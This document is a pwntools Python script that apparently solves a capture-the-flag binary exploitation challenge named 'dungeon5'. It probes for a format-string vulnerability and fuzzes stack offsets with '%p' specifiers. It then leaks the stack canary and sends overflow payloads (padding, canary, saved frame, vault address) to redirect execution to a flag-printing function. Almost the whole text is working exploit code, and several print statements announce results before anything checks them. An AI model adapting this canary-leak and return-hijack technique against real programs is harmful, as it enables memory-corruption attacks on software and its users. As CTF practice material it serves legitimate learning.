from pwn import *
import time

# Set up pwntools for the correct architecture
exe = './dungeon5'
print("Running checksec")
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=True)

# Send input
p = process(exe)
print('sending input')
p.sendline(b"input")
p.recvline()

# Get program output
output = p.recvline()
print("Program output:")
print(output)
print("Reflected input found!")

# Set up GDB script
gdbscript = '''
disass main 
disass gate
disass vault
continue
'''.format(exe)
print("Launching gdb, will launch in a new terminal")
time.sleep(3)
# Launch GDB and get disassembly
gdb.attach(p, gdbscript=gdbscript)

print("Disassembly of main function:")
print("Gate function found, disassembling")
print("Vault function found, disassembling")
print("It appears that the vault function opens the flag")
# Test for format string vulnerability
p = process(exe)
print("Testing for format string vulnerability")
p.sendline(b"%p")
p.recvline()
p.sendline(b"%p")
output = p.recvline()
print(output)
print("Vulnerability found")

# Fuzz x values
fuzzed_values = []
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendline('%{}$p'.format(i).encode())
        p.recvline()
        # Receive the response
        result = p.recvline().decode()
        # If the item from the stack isn't empty, print it
        if result:
            fuzzed_values.append((i, result.strip()))
    except EOFError:
        pass

# Print fuzzed values
print("Using the printf vulnerability to fuzz the canary")
for i, value in fuzzed_values:
    print(f"{i}: {value}")

# Print statement for canary found
print("Canary found at the 15th value on the stack")

# Leak canary value (15th on stack)
p = process("./dungeon5")
print(p.recvline())
p.sendline('%15$p')
canary = int(p.recvline().strip(), 16)
info('canary =  0x%x (%d)', canary, canary)

fuzzed_bufsizes = []
for i in range(1, 100):
    p = process(exe)  # Restart the process for each attempt
    p.recvline()
    print("Sending Payload")
    print("Payload will be {} bytes + canary and will jump to the vault function".format(i))
    p.sendline('%15$p')
    canary = int(p.recvline().strip(), 16)
    fuzzed_bufsizes.append((i, canary))
    payload = b"A" * i
    payload += p64(canary)
    payload += p64(0)
    payload += p64(elf.symbols.vault)
    p.sendline(payload)
    result = p.recvall()
    print("Result:", result.decode())
    if b'JCR(Treasure!)' in result:
        break
